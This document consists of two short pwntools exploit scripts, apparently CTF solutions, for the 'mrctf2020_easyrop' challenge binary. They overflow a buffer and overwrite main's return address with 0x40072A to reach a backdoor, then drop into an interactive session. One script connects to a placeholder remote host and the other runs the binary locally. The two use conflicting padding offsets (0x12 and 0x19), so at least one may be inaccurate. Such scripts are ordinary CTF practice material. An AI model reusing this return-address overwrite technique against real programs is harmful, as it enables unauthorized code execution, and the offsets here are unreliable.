from pwn import*
context(arch="amd64",log_level="debug")
#p=process("./mrctf2020_easyrop")
p=remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
back=0x40072A
p.sendline(str(2))
#sleep(1)
payload1=b'a'*0x300
p.send(payload1)
#p.sendlineafter(str(2),payload1)
p.sendline(str(7))
#sleep(1)
payload=b'a'*0x12+p64(back)
p.send(payload)
#p.sendlineafter(str(7),payload)
p.interactive()


from pwn import *
context.binary = './mrctf2020_easyrop'
context.log_level = 'debug'
p = process(context.binary.path)
back = 0x40072A
# 第一轮：填充缓冲区
p.sendline(b'2')
p.sendafter(
    b'hehehehehehehe\n',
    b'A' * 0x2ff + b'\x00'
)
# 第二轮：覆盖 main 的返回地址
p.sendline(b'7')
payload = b'B' * 0x19 + p64(back)
p.sendafter(b'bybybybybybyby\n', payload)
p.interactive()